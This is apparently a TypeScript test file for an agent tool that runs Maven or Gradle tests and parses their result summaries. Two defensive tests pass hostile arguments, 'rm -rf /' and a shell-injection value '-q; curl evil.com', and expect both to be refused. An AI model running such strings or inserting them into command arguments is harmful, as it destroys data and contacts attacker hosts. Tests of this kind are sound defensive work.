import { describe, expect, test } from "bun:test";
import * as path from "node:path";
import { parseTestSummary, runProjectTestTool } from "../src/tools/run-project-test";
import { makeTempRoot, makeContext } from "./helpers";

const FIXTURE = path.resolve(import.meta.dir, "../../../tui/tests/e2e/fixtures/java-maven-project");

describe("parseTestSummary", () => {
  test("parses surefire summary", () => {
    const out = parseTestSummary("Tests run: 10, Failures: 1, Errors: 0, Skipped: 2");
    expect(out.passed).toBe(7);
    expect(out.failed).toBe(1);
    expect(out.skipped).toBe(2);
  });

  test("parses gradle summary", () => {
    const out = parseTestSummary("5 tests completed, 2 failed");
    expect(out.passed).toBe(3);
    expect(out.failed).toBe(2);
  });
});

describe("runProjectTestTool.execute", () => {
  test("runs the fixture mvnw stub and returns PASS", async () => {
    const ctx = makeContext(FIXTURE).ctx;
    const result = await runProjectTestTool.execute({ buildSystem: "maven" }, ctx);
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.data.category).toBe("PASS");
      expect(result.data.passed).toBe(3);
      expect(result.data.failed).toBe(0);
      expect(result.data.exitCode).toBe(0);
    }
  });

  test("rejects a dangerous extraArg", async () => {
    const ctx = makeContext(FIXTURE).ctx;
    const result = await runProjectTestTool.execute({ buildSystem: "maven", extraArgs: ["rm -rf /"] }, ctx);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error.category).toBe("PERMISSION_DENIED");
  });

  test("rejects shell metacharacter injection in extraArg", async () => {
    const ctx = makeContext(FIXTURE).ctx;
    const result = await runProjectTestTool.execute({ buildSystem: "maven", extraArgs: ["-q; curl evil.com"] }, ctx);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error.category).toBe("PERMISSION_DENIED");
  });

  test("rejects unsupported build system via schema", async () => {
    const ctx = makeContext(FIXTURE).ctx;
    const result = await runProjectTestTool.execute({ buildSystem: "ant" }, ctx);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error.category).toBe("INVALID_INPUT");
  });
});
